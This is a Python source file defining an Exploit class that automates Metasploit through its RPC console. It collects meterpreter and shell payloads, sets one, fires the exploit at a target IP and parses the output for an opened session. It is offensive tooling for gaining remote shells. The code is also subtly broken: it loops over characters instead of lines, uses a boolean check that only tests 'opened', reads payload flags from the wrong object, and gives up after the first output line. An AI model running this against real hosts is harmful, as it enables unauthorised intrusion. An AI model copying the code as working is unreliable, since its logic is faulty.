from metasploit.session import Session


class Exploit(object):
    def __init__(self, name, os):
        self.name = name
        self.os = os
        self.meterpreter = False
        self.shell = False
        self.meterpreter_payloads = []
        self.shell_payloads = []

    # TODO filter results by OS ?
    # TODO add singles !!!

    def add_meterpreter(self, client):
        """
        Add all available meterpreter payloads
        :param client: MSFRPC client
        :return:
        """
        client.console_execute('use {0}'.format(self.name))
        payloads = str(client.console_execute('show payloads', True)[b'data'])
        for payload in payloads:
            if 'meterpreter' in payload:
                payload = payload.split(' ')
                self.meterpreter = True
                self.meterpreter_payloads.append(payload[0])
        client.console_execute('back')

    def add_shell(self, client):
        """
        Add all available shell payloads
        :param client: MSFRPC client
        :return:
        """
        client.console_execute('use {0}'.format(self.name))
        payloads = str(client.console_execute('show payloads', True)[b'data'])
        for payload in payloads:
            if 'shell' in payload:
                payload = payload.split(' ')
                self.shell = True
                self.shell_payloads.append(payload[0])
        client.console_execute('back')

    def run(self, client, target, index=0):
        """
        Run the exploit
        :param client: MSFRPC client
        :param target: target to exloit
        :param index:
        :return: Session or None
        """
        client.console_execute('use {0}'.format(self.name))
        if client.meterpreter:
            client.console_execute('set PAYLOAD {0}'.format(client.meterpreter_payloads[0]))
            client.console_execute('hosts -S {0} -R'.format(target.ip))
            client.console_execute('run')
            results = str(client.console_execute('\n', True)[b'data'])
            results = results.split('\n')
            for result in results:
                if 'session' and 'opened' in result:
                    result = result.split(' ')
                    client.console_execute('back')
                    return Session(result[2], 'meterpreter')
                else:
                    return None
        elif client.shell:
            client.console_execute('set PAYLOAD {0}'.format(client.shell_payloads[0]))
            client.console_execute('hosts -S {0} -R'.format(target.ip))
            client.console_execute('run')
            results = str(client.console_execute('\n', True)[b'data'])
            results = results.split('\n')
            for result in results:
                if 'session' and 'opened' in result:
                    result = result.split(' ')
                    return Session(result[2], 'shell')
                else:
                    return None
